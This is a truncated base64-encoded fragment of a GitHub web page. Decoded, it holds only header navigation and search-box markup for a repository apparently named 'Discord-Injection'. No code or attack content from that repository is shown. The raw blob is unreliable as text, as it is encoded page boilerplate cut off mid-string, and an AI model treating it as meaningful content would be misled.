Q7OiZxdW90O2NsaWNrIHRvIGdvIHRvIFdoaXRlIHBhcGVycywgRWJvb2tzLCBXZWJpbmFycyZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDtyZWZfY3RhOldoaXRlIHBhcGVycywgRWJvb2tzLCBXZWJpbmFyczsmcXVvdDt9IiBocmVmPSJodHRwczovL3Jlc291cmNlcy5naXRodWIuY29tLyI+CiAgICAgIFdoaXRlIHBhcGVycywgRWJvb2tzLCBXZWJpbmFycwoKICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tbGluay1leHRlcm5hbCBIZWFkZXJNZW51LWV4dGVybmFsLWljb24gY29sb3ItZmctc3VidGxlIj4KICAgIDxwYXRoIGQ9Ik0zLjc1IDJoMy41YS43NS43NSAwIDAgMSAwIDEuNWgtMy41YS4yNS4yNSAwIDAgMC0uMjUuMjV2OC41YzAgLjEzOC4xMTIuMjUuMjUuMjVoOC41YS4yNS4yNSAwIDAgMCAuMjUtLjI1di0zLjVhLjc1Ljc1IDAgMCAxIDEuNSAwdjMuNUExLjc1IDEuNzUgMCAwIDEgMTIuMjUgMTRoLTguNUExLjc1IDEuNzUgMCAwIDEgMiAxMi4yNXYtOC41QzIgMi43ODQgMi43ODQgMiAzLjc1IDJabTYuODU0LTFoNC4xNDZhLjI1LjI1IDAgMCAxIC4yNS4yNXY0LjE0NmEuMjUuMjUgMCAwIDEtLjQyNy4xNzdMMTMuMDMgNC4wMyA5LjI4IDcuNzhhLjc1MS43NTEgMCAwIDEtMS4wNDItLjAxOC43NTEuNzUxIDAgMCAxLS4wMTgtMS4wNDJsMy43NS0zLjc1LTEuNTQzLTEuNTQzQS4yNS4yNSAwIDAgMSAxMC42MDQgMVoiPjwvcGF0aD4KPC9zdmc+CjwvYT48L2xpPgoKICAgICAgICAgICAgICAgIDxsaT4KICA8YSBjbGFzcz0iSGVhZGVyTWVudS1kcm9wZG93bi1saW5rIGxoLWNvbmRlbnNlZCBkLWJsb2NrIG5vLXVuZGVybGluZSBwb3NpdGlvbi1yZWxhdGl2ZSBweS0yIExpbmstLXNlY29uZGFyeSIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtIZWFkZXIgZHJvcGRvd24gKGxvZ2dlZCBvdXQpLCBTb2x1dGlvbnMmcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O2NsaWNrIHRvIGdvIHRvIEN1c3RvbWVyIFN0b3JpZXMmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7cmVmX2N0YTpDdXN0b21lciBTdG9yaWVzOyZxdW90O30iIGhyZWY9Ii9jdXN0b21lci1zdG9yaWVzIj4KICAgICAgQ3VzdG9tZXIgU3RvcmllcwoKICAgIAo8L2E+PC9saT4KCiAgICAgICAgICAgICAgICA8bGk+CiAgPGEgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24tbGluayBsaC1jb25kZW5zZWQgZC1ibG9jayBuby11bmRlcmxpbmUgcG9zaXRpb24tcmVsYXRpdmUgcHktMiBMaW5rLS1zZWNvbmRhcnkiIHRhcmdldD0iX2JsYW5rIiBkYXRhLWFuYWx5dGljcy1ldmVudD0ieyZxdW90O2NhdGVnb3J5JnF1b3Q7OiZxdW90O0hlYWRlciBkcm9wZG93biAobG9nZ2VkIG91dCksIFNvbHV0aW9ucyZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Y2xpY2sgdG8gZ28gdG8gUGFydG5lcnMmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7cmVmX2N0YTpQYXJ0bmVyczsmcXVvdDt9IiBocmVmPSJodHRwczovL3BhcnRuZXIuZ2l0aHViLmNvbS8iPgogICAgICBQYXJ0bmVycwoKICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tbGluay1leHRlcm5hbCBIZWFkZXJNZW51LWV4dGVybmFsLWljb24gY29sb3ItZmctc3VidGxlIj4KICAgIDxwYXRoIGQ9Ik0zLjc1IDJoMy41YS43NS43NSAwIDAgMSAwIDEuNWgtMy41YS4yNS4yNSAwIDAgMC0uMjUuMjV2OC41YzAgLjEzOC4xMTIuMjUuMjUuMjVoOC41YS4yNS4yNSAwIDAgMCAuMjUtLjI1di0zLjVhLjc1Ljc1IDAgMCAxIDEuNSAwdjMuNUExLjc1IDEuNzUgMCAwIDEgMTIuMjUgMTRoLTguNUExLjc1IDEuNzUgMCAwIDEgMiAxMi4yNXYtOC41QzIgMi43ODQgMi43ODQgMiAzLjc1IDJabTYuODU0LTFoNC4xNDZhLjI1LjI1IDAgMCAxIC4yNS4yNXY0LjE0NmEuMjUuMjUgMCAwIDEtLjQyNy4xNzdMMTMuMDMgNC4wMyA5LjI4IDcuNzhhLjc1MS43NTEgMCAwIDEtMS4wNDItLjAxOC43NTEuNzUxIDAgMCAxLS4wMTgtMS4wNDJsMy43NS0zLjc1LTEuNTQzLTEuNTQzQS4yNS4yNSAwIDAgMSAxMC42MDQgMVoiPjwvcGF0aD4KPC9zdmc+CjwvYT48L2xpPgoKICAgICAgICAgICAgPC91bD4KICAgICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KPC9saT4KCgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJIZWFkZXJNZW51LWl0ZW0gcG9zaXRpb24tcmVsYXRpdmUgZmxleC13cmFwIGZsZXgtanVzdGlmeS1iZXR3ZWVuIGZsZXgtaXRlbXMtY2VudGVyIGQtYmxvY2sgZC1sZy1mbGV4IGZsZXgtbGctbm93cmFwIGZsZXgtbGctaXRlbXMtY2VudGVyIGpzLWRldGFpbHMtY29udGFpbmVyIGpzLWhlYWRlci1tZW51LWl0ZW0iPgogICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9IkhlYWRlck1lbnUtbGluayBib3JkZXItMCB3aWR0aC1mdWxsIHdpZHRoLWxnLWF1dG8gcHgtMCBweC1sZy0yIHB5LTMgcHktbGctMiBuby13cmFwIGQtZmxleCBmbGV4LWl0ZW1zLWNlbnRlciBmbGV4LWp1c3RpZnktYmV0d2VlbiBqcy1kZXRhaWxzLXRhcmdldCIgYXJpYS1leHBhbmRlZD0iZmFsc2UiPgogICAgICAgIE9wZW4gU291cmNlCiAgICAgICAgPHN2ZyBvcGFjaXR5PSIwLjUiIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLWNoZXZyb24tZG93biBIZWFkZXJNZW51LWljb24gbWwtMSI+CiAgICA8cGF0aCBkPSJNMTIuNzggNS4yMmEuNzQ5Ljc0OSAwIDAgMSAwIDEuMDZsLTQuMjUgNC4yNWEuNzQ5Ljc0OSAwIDAgMS0xLjA2IDBMMy4yMiA2LjI4YS43NDkuNzQ5IDAgMSAxIDEuMDYtMS4wNkw4IDguOTM5bDMuNzItMy43MTlhLjc0OS43NDkgMCAwIDEgMS4wNiAwWiI+PC9wYXRoPgo8L3N2Zz4KICAgICAgPC9idXR0b24+CiAgICAgIDxkaXYgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24gZHJvcGRvd24tbWVudSByb3VuZGVkIG0tMCBwLTAgcHktMiBweS1sZy00IHBvc2l0aW9uLXJlbGF0aXZlIHBvc2l0aW9uLWxnLWFic29sdXRlIGxlZnQtMCBsZWZ0LWxnLW4zIHB4LWxnLTQiPgogICAgICAgICAgPGRpdiBjbGFzcz0iYm9yZGVyLWJvdHRvbSBwYi0zIG1iLTMiPgogICAgICAgICAgICA8dWwgY2xhc3M9Imxpc3Qtc3R5bGUtbm9uZSBmNSIgPgogICAgICAgICAgICAgICAgPGxpPgogIDxhIGNsYXNzPSJIZWFkZXJNZW51LWRyb3Bkb3duLWxpbmsgbGgtY29uZGVuc2VkIGQtYmxvY2sgbm8tdW5kZXJsaW5lIHBvc2l0aW9uLXJlbGF0aXZlIHB5LTIgTGluay0tc2Vjb25kYXJ5IGQtZmxleCBmbGV4LWl0ZW1zLWNlbnRlciIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtIZWFkZXIgZHJvcGRvd24gKGxvZ2dlZCBvdXQpLCBPcGVuIFNvdXJjZSZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Y2xpY2sgdG8gZ28gdG8gR2l0SHViIFNwb25zb3JzJnF1b3Q7LCZxdW90O2xhYmVsJnF1b3Q7OiZxdW90O3JlZl9jdGE6R2l0SHViIFNwb25zb3JzOyZxdW90O30iIGhyZWY9Ii9zcG9uc29ycyI+CiAgICAgIAogICAgICA8ZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNvbG9yLWZnLWRlZmF1bHQgaDQiPkdpdEh1YiBTcG9uc29yczwvZGl2PgogICAgICAgIEZ1bmQgb3BlbiBzb3VyY2UgZGV2ZWxvcGVycwogICAgICA8L2Rpdj4KCiAgICAKPC9hPjwvbGk+CgogICAgICAgICAgICA8L3VsPgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJib3JkZXItYm90dG9tIHBiLTMgbWItMyI+CiAgICAgICAgICAgIDx1bCBjbGFzcz0ibGlzdC1zdHlsZS1ub25lIGY1IiA+CiAgICAgICAgICAgICAgICA8bGk+CiAgPGEgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24tbGluayBsaC1jb25kZW5zZWQgZC1ibG9jayBuby11bmRlcmxpbmUgcG9zaXRpb24tcmVsYXRpdmUgcHktMiBMaW5rLS1zZWNvbmRhcnkgZC1mbGV4IGZsZXgtaXRlbXMtY2VudGVyIiBkYXRhLWFuYWx5dGljcy1ldmVudD0ieyZxdW90O2NhdGVnb3J5JnF1b3Q7OiZxdW90O0hlYWRlciBkcm9wZG93biAobG9nZ2VkIG91dCksIE9wZW4gU291cmNlJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtjbGljayB0byBnbyB0byBUaGUgUmVhZE1FIFByb2plY3QmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7cmVmX2N0YTpUaGUgUmVhZE1FIFByb2plY3Q7JnF1b3Q7fSIgaHJlZj0iL3JlYWRtZSI+CiAgICAgIAogICAgICA8ZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNvbG9yLWZnLWRlZmF1bHQgaDQiPlRoZSBSZWFkTUUgUHJvamVjdDwvZGl2PgogICAgICAgIEdpdEh1YiBjb21tdW5pdHkgYXJ0aWNsZXMKICAgICAgPC9kaXY+CgogICAgCjwvYT48L2xpPgoKICAgICAgICAgICAgPC91bD4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iIj4KICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iZC1ibG9jayBoNCBjb2xvci1mZy1kZWZhdWx0IG15LTEiIGlkPSJvcGVuLXNvdXJjZS1yZXBvc2l0b3JpZXMtaGVhZGluZyI+UmVwb3NpdG9yaWVzPC9zcGFuPgogICAgICAgICAgICA8dWwgY2xhc3M9Imxpc3Qtc3R5bGUtbm9uZSBmNSIgYXJpYS1sYWJlbGxlZGJ5PSJvcGVuLXNvdXJjZS1yZXBvc2l0b3JpZXMtaGVhZGluZyI+CiAgICAgICAgICAgICAgICA8bGk+CiAgPGEgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24tbGluayBsaC1jb25kZW5zZWQgZC1ibG9jayBuby11bmRlcmxpbmUgcG9zaXRpb24tcmVsYXRpdmUgcHktMiBMaW5rLS1zZWNvbmRhcnkiIGRhdGEtYW5hbHl0aWNzLWV2ZW50PSJ7JnF1b3Q7Y2F0ZWdvcnkmcXVvdDs6JnF1b3Q7SGVhZGVyIGRyb3Bkb3duIChsb2dnZWQgb3V0KSwgT3BlbiBTb3VyY2UmcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O2NsaWNrIHRvIGdvIHRvIFRvcGljcyZxdW90OywmcXVvdDtsYWJlbCZxdW90OzomcXVvdDtyZWZfY3RhOlRvcGljczsmcXVvdDt9IiBocmVmPSIvdG9waWNzIj4KICAgICAgVG9waWNzCgogICAgCjwvYT48L2xpPgoKICAgICAgICAgICAgICAgIDxsaT4KICA8YSBjbGFzcz0iSGVhZGVyTWVudS1kcm9wZG93bi1saW5rIGxoLWNvbmRlbnNlZCBkLWJsb2NrIG5vLXVuZGVybGluZSBwb3NpdGlvbi1yZWxhdGl2ZSBweS0yIExpbmstLXNlY29uZGFyeSIgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtIZWFkZXIgZHJvcGRvd24gKGxvZ2dlZCBvdXQpLCBPcGVuIFNvdXJjZSZxdW90OywmcXVvdDthY3Rpb24mcXVvdDs6JnF1b3Q7Y2xpY2sgdG8gZ28gdG8gVHJlbmRpbmcmcXVvdDssJnF1b3Q7bGFiZWwmcXVvdDs6JnF1b3Q7cmVmX2N0YTpUcmVuZGluZzsmcXVvdDt9IiBocmVmPSIvdHJlbmRpbmciPgogICAgICBUcmVuZGluZwoKICAgIAo8L2E+PC9saT4KCiAgICAgICAgICAgICAgICA8bGk+CiAgPGEgY2xhc3M9IkhlYWRlck1lbnUtZHJvcGRvd24tbGluayBsaC1jb25kZW5zZWQgZC1ibG9jayBuby11bmRlcmxpbmUgcG9zaXRpb24tcmVsYXRpdmUgcHktMiBMaW5rLS1zZWNvbmRhcnkiIGRhdGEtYW5hbHl0aWNzLWV2ZW50PSJ7JnF1b3Q7Y2F0ZWdvcnkmcXVvdDs6JnF1b3Q7SGVhZGVyIGRyb3Bkb3duIChsb2dnZWQgb3V0KSwgT3BlbiBTb3VyY2UmcXVvdDssJnF1b3Q7YWN0aW9uJnF1b3Q7OiZxdW90O2NsaWNrIHRvIGdvIHRvIENvbGxlY3Rpb25zJnF1b3Q7LCZxdW90O2xhYmVsJnF1b3Q7OiZxdW90O3JlZl9jdGE6Q29sbGVjdGlvbnM7JnF1b3Q7fSIgaHJlZj0iL2NvbGxlY3Rpb25zIj4KICAgICAgQ29sbGVjdGlvbnMKCiAgICAKPC9hPjwvbGk+CgogICAgICAgICAgICA8L3VsPgogICAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2Pgo8L2xpPgoKCiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9IkhlYWRlck1lbnUtaXRlbSBwb3NpdGlvbi1yZWxhdGl2ZSBmbGV4LXdyYXAgZmxleC1qdXN0aWZ5LWJldHdlZW4gZmxleC1pdGVtcy1jZW50ZXIgZC1ibG9jayBkLWxnLWZsZXggZmxleC1sZy1ub3dyYXAgZmxleC1sZy1pdGVtcy1jZW50ZXIganMtZGV0YWlscy1jb250YWluZXIganMtaGVhZGVyLW1lbnUtaXRlbSI+CiAgICA8YSBjbGFzcz0iSGVhZGVyTWVudS1saW5rIG5vLXVuZGVybGluZSBweC0wIHB4LWxnLTIgcHktMyBweS1sZy0yIGQtYmxvY2sgZC1sZy1pbmxpbmUtYmxvY2siIGRhdGEtYW5hbHl0aWNzLWV2ZW50PSJ7JnF1b3Q7Y2F0ZWdvcnkmcXVvdDs6JnF1b3Q7SGVhZGVyIG1lbnUgdG9wIGl0ZW0gKGxvZ2dlZCBvdXQpJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtjbGljayB0byBnbyB0byBQcmljaW5nJnF1b3Q7LCZxdW90O2xhYmVsJnF1b3Q7OiZxdW90O3JlZl9jdGE6UHJpY2luZzsmcXVvdDt9IiBocmVmPSIvcHJpY2luZyI+UHJpY2luZzwvYT4KPC9saT4KCiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICA8L25hdj4KCiAgICAgICAgPGRpdiBjbGFzcz0iZC1sZy1mbGV4IGZsZXgtaXRlbXMtY2VudGVyIG1iLTMgbWItbGctMCB0ZXh0LWNlbnRlciB0ZXh0LWxnLWxlZnQgbWwtMyIgc3R5bGU9IiI+CiAgICAgICAgICAgICAgICAKCgo8cWJzZWFyY2gtaW5wdXQgY2xhc3M9InNlYXJjaC1pbnB1dCIgZGF0YS1zY29wZT0icmVwbzpza29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24iIGRhdGEtY3VzdG9tLXNjb3Blcy1wYXRoPSIvc2VhcmNoL2N1c3RvbV9zY29wZXMiIGRhdGEtZGVsZXRlLWN1c3RvbS1zY29wZXMtY3NyZj0iTlh6ZTRkbjRTQ19IcWowZkhoZnY0QUdnc3RoeG5aQVNYVkM3SzB6UnNJOE9NNHpIbi16czV1d2JwakxZQUJEU3VpU2RzVkZmQnhJQUNkZlFoc0JIQkEiIGRhdGEtbWF4LWN1c3RvbS1zY29wZXM9IjEwIiBkYXRhLWhlYWRlci1yZWRlc2lnbi1lbmFibGVkPSJmYWxzZSIgZGF0YS1pbml0aWFsLXZhbHVlPSIiIGRhdGEtYmxhY2tiaXJkLXN1Z2dlc3Rpb25zLXBhdGg9Ii9zZWFyY2gvc3VnZ2VzdGlvbnMiIGRhdGEtanVtcC10by1zdWdnZXN0aW9ucy1wYXRoPSIvX2dyYXBocWwvR2V0U3VnZ2VzdGVkTmF2aWdhdGlvbkRlc3RpbmF0aW9ucyIgZGF0YS1jdXJyZW50LXJlcG9zaXRvcnk9InNrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbiIgZGF0YS1jdXJyZW50LW9yZz0iIiBkYXRhLWN1cnJlbnQtb3duZXI9InNrb2Nod2FzaGVyZSIgZGF0YS1sb2dnZWQtaW49ImZhbHNlIj4KICA8ZGl2CiAgICBjbGFzcz0ic2VhcmNoLWlucHV0LWNvbnRhaW5lciBzZWFyY2gtd2l0aC1kaWFsb2cgcG9zaXRpb24tcmVsYXRpdmUgZC1mbGV4IGZsZXgtcm93IGZsZXgtaXRlbXMtY2VudGVyIG1yLTQgcm91bmRlZCIKICAgIGRhdGEtYWN0aW9uPSJjbGljazpxYnNlYXJjaC1pbnB1dCNzZWFyY2hJbnB1dENvbnRhaW5lckNsaWNrZWQiCiAgPgogICAgICA8YnV0dG9uCiAgICAgICAgdHlwZT0iYnV0dG9uIgogICAgICAgIGNsYXNzPSJoZWFkZXItc2VhcmNoLWJ1dHRvbiBwbGFjZWhvbGRlciAgaW5wdXQtYnV0dG9uIGZvcm0tY29udHJvbCBkLWZsZXggZmxleC0xIGZsZXgtc2VsZi1zdHJldGNoIGZsZXgtaXRlbXMtY2VudGVyIG5vLXdyYXAgd2lkdGgtZnVsbCBweS0wIHBsLTIgcHItMCB0ZXh0LWxlZnQgYm9yZGVyLTAgYm94LXNoYWRvdy1ub25lIgogICAgICAgIGRhdGEtdGFyZ2V0PSJxYnNlYXJjaC1pbnB1dC5pbnB1dEJ1dHRvbiIKICAgICAgICBwbGFjZWhvbGRlcj0iU2VhcmNoIG9yIGp1bXAgdG8uLi4iCiAgICAgICAgZGF0YS1ob3RrZXk9cywvCiAgICAgICAgYXV0b2NhcGl0YWxpemU9Im9mZiIKICAgICAgICBkYXRhLWFjdGlvbj0iY2xpY2s6cWJzZWFyY2gtaW5wdXQjaGFuZGxlRXhwYW5kIgogICAgICA+CiAgICAgICAgPGRpdiBjbGFzcz0ibXItMiBjb2xvci1mZy1tdXRlZCI+CiAgICAgICAgICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLXNlYXJjaCI+CiAgICA8cGF0aCBkPSJNMTAuNjggMTEuNzRhNiA2IDAgMCAxLTcuOTIyLTguOTgyIDYgNiAwIDAgMSA4Ljk4MiA3LjkyMmwzLjA0IDMuMDRhLjc0OS43NDkgMCAwIDEtLjMyNiAxLjI3NS43NDkuNzQ5IDAgMCAxLS43MzQtLjIxNVpNMTEuNSA3YTQuNDk5IDQuNDk5IDAgMSAwLTguOTk3IDBBNC40OTkgNC40OTkgMCAwIDAgMTEuNSA3WiI+PC9wYXRoPgo8L3N2Zz4KICAgICAgICA8L2Rpdj4KICAgICAgICA8c3BhbiBjbGFzcz0iZmxleC0xIiBkYXRhLXRhcmdldD0icWJzZWFyY2gtaW5wdXQuaW5wdXRCdXR0b25UZXh0Ij5TZWFyY2ggb3IganVtcCB0by4uLjwvc3Bhbj4KICAgICAgICAgIDxkaXYgY2xhc3M9ImQtZmxleCIgZGF0YS10YXJnZXQ9InFic2VhcmNoLWlucHV0LmhvdGtleUluZGljYXRvciI+CiAgICAgICAgICAgIDxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMjIiIGhlaWdodD0iMjAiIGFyaWEtaGlkZGVuPSJ0cnVlIiBjbGFzcz0ibXItMSI+PHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSIjOTc5QTlDIiBvcGFjaXR5PSIuNCIgZD0iTTMuNS41aDEyYzEuNyAwIDMgMS4zIDMgM3YxM2MwIDEuNy0xLjMgMy0zIDNoLTEyYy0xLjcgMC0zLTEuMy0zLTN2LTEzYzAtMS43IDEuMy0zIDMtM3oiPjwvcGF0aD48cGF0aCBmaWxsPSIjOTc5QTlDIiBkPSJNMTEuOCA2TDggMTUuMWgtLjlMMTAuOCA2aDF6Ij48L3BhdGg+PC9zdmc+CgogICAgICAgICAgPC9kaXY+CiAgICAgIDwvYnV0dG9uPgoKICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InR5cGUiIGNsYXNzPSJqcy1zaXRlLXNlYXJjaC10eXBlLWZpZWxkIj4KCiAgICAKPGRpdiBjbGFzcz0iT3ZlcmxheS0taGlkZGVuICIgZGF0YS1tb2RhbC1kaWFsb2ctb3ZlcmxheT4KICA8bW9kYWwtZGlhbG9nIGRhdGEtYWN0aW9uPSJjbG9zZTpxYnNlYXJjaC1pbnB1dCNoYW5kbGVDbG9zZSBjYW5jZWw6cWJzZWFyY2gtaW5wdXQjaGFuZGxlQ2xvc2UiIGRhdGEtdGFyZ2V0PSJxYnNlYXJjaC1pbnB1dC5zZWFyY2hTdWdnZXN0aW9uc0RpYWxvZyIgcm9sZT0iZGlhbG9nIiBpZD0ic2VhcmNoLXN1Z2dlc3Rpb25zLWRpYWxvZyIgYXJpYS1tb2RhbD0idHJ1ZSIgYXJpYS1sYWJlbGxlZGJ5PSJzZWFyY2gtc3VnZ2VzdGlvbnMtZGlhbG9nLWhlYWRlciIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Ik92ZXJsYXkgT3ZlcmxheS0td2lkdGgtbGFyZ2UgT3ZlcmxheS0taGVpZ2h0LWF1dG8iPgogICAgICA8aDEgaWQ9InNlYXJjaC1zdWdnZXN0aW9ucy1kaWFsb2ctaGVhZGVyIiBjbGFzcz0ic3Itb25seSI+U2VhcmNoIGNvZGUsIHJlcG9zaXRvcmllcywgdXNlcnMsIGlzc3VlcywgcHVsbCByZXF1ZXN0cy4uLjwvaDE+CiAgICA8ZGl2IGNsYXNzPSJPdmVybGF5LWJvZHkgT3ZlcmxheS1ib2R5LS1wYWRkaW5nTm9uZSI+CiAgICAgIAogICAgICAgICAgPGRpdiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIj4gICAgICAgIDxkaXYgY2xhc3M9InNlYXJjaC1zdWdnZXN0aW9ucyBwb3NpdGlvbi1maXhlZCB3aWR0aC1mdWxsIGNvbG9yLXNoYWRvdy1sYXJnZSBib3JkZXIgY29sb3ItZmctZGVmYXVsdCBjb2xvci1iZy1kZWZhdWx0IG92ZXJmbG93LWhpZGRlbiBkLWZsZXggZmxleC1jb2x1bW4gcXVlcnktYnVpbGRlci1jb250YWluZXIiCiAgICAgICAgICBzdHlsZT0iYm9yZGVyLXJhZGl1czogMTJweDsiCiAgICAgICAgICBkYXRhLXRhcmdldD0icWJzZWFyY2gtaW5wdXQucXVlcnlCdWlsZGVyQ29udGFpbmVyIgogICAgICAgICAgaGlkZGVuCiAgICAgICAgPgogICAgICAgICAgPCEtLSAnImAgLS0+PCEtLSA8L3RleHRhcmVhPjwveG1wPiAtLT48L29wdGlvbj48L2Zvcm0+PGZvcm0gaWQ9InF1ZXJ5LWJ1aWxkZXItdGVzdC1mb3JtIiBhY3Rpb249IiIgYWNjZXB0LWNoYXJzZXQ9IlVURi04IiBtZXRob2Q9ImdldCI+CiAgPHF1ZXJ5LWJ1aWxkZXIgZGF0YS10YXJnZXQ9InFic2VhcmNoLWlucHV0LnF1ZXJ5QnVpbGRlciIgaWQ9InF1ZXJ5LWJ1aWxkZXItcXVlcnktYnVpbGRlci10ZXN0IiBkYXRhLWZpbHRlci1rZXk9IjoiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJRdWVyeUJ1aWxkZXIgc2VhcmNoLXF1ZXJ5LWJ1aWxkZXIiPgogICAgPGRpdiBjbGFzcz0iRm9ybUNvbnRyb2wgRm9ybUNvbnRyb2wtLWZ1bGxXaWR0aCI+CiAgICAgIDxsYWJlbCBpZD0icXVlcnktYnVpbGRlci10ZXN0LWxhYmVsIiBmb3I9InF1ZXJ5LWJ1aWxkZXItdGVzdCIgY2xhc3M9IkZvcm1Db250cm9sLWxhYmVsIHNyLW9ubHkiPgogICAgICAgIFNlYXJjaAogICAgICA8L2xhYmVsPgogICAgICA8ZGl2CiAgICAgICAgY2xhc3M9IlF1ZXJ5QnVpbGRlci1TdHlsZWRJbnB1dCB3aWR0aC1maXQgIgogICAgICAgIGRhdGEtdGFyZ2V0PSJxdWVyeS1idWlsZGVyLnN0eWxlZElucHV0IgogICAgICA+CiAgICAgICAgICA8c3BhbiBpZD0icXVlcnktYnVpbGRlci10ZXN0LWxlYWRpbmd2aXN1YWwtd3JhcCIgY2xhc3M9IkZvcm1Db250cm9sLWlucHV0LWxlYWRpbmdWaXN1YWxXcmFwIFF1ZXJ5QnVpbGRlci1sZWFkaW5nVmlzdWFsV3JhcCI+CiAgICAgICAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tc2VhcmNoIEZvcm1Db250cm9sLWlucHV0LWxlYWRpbmdWaXN1YWwiPgogICAgPHBhdGggZD0iTTEwLjY4IDExLjc0YTYgNiAwIDAgMS03LjkyMi04Ljk4MiA2IDYgMCAwIDEgOC45ODIgNy45MjJsMy4wNCAzLjA0YS43NDkuNzQ5IDAgMCAxLS4zMjYgMS4yNzUuNzQ5Ljc0OSAwIDAgMS0uNzM0LS4yMTVaTTExLjUgN2E0LjQ5OSA0LjQ5OSAwIDEgMC04Ljk5NyAwQTQuNDk5IDQuNDk5IDAgMCAwIDExLjUgN1oiPjwvcGF0aD4KPC9zdmc+CiAgICAgICAgICA8L3NwYW4+CiAgICAgICAgPGRpdiBkYXRhLXRhcmdldD0icXVlcnktYnVpbGRlci5zdHlsZWRJbnB1dENvbnRhaW5lciIgY2xhc3M9IlF1ZXJ5QnVpbGRlci1TdHlsZWRJbnB1dENvbnRhaW5lciI+CiAgICAgICAgICA8ZGl2CiAgICAgICAgICAgIGFyaWEtaGlkZGVuPSJ0cnVlIgogICAgICAgICAgICBjbGFzcz0iUXVlcnlCdWlsZGVyLVN0eWxlZElucHV0Q29udGVudCIKICAgICAgICAgICAgZGF0YS10YXJnZXQ9InF1ZXJ5LWJ1aWxkZXIuc3R5bGVkSW5wdXRDb250ZW50IgogICAgICAgICAgPjwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iUXVlcnlCdWlsZGVyLUlucHV0V3JhcHBlciI+CiAgICAgICAgICAgIDxkaXYgYXJpYS1oaWRkZW49InRydWUiIGNsYXNzPSJRdWVyeUJ1aWxkZXItU2l6ZXIiIGRhdGEtdGFyZ2V0PSJxdWVyeS1idWlsZGVyLnNpemVyIj48L2Rpdj4KICAgICAgICAgICAgPGlucHV0IGlkPSJxdWVyeS1idWlsZGVyLXRlc3QiIG5hbWU9InF1ZXJ5LWJ1aWxkZXItdGVzdCIgdmFsdWU9IiIgYXV0b2NvbXBsZXRlPSJvZmYiIHR5cGU9InRleHQiIHJvbGU9ImNvbWJvYm94IiBzcGVsbGNoZWNrPSJmYWxzZSIgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtZGVzY3JpYmVkYnk9InZhbGlkYXRpb24tNzU0MGQwMzItZDUwMi00NzgyLTg5ZTctZDc4ZWI4Zm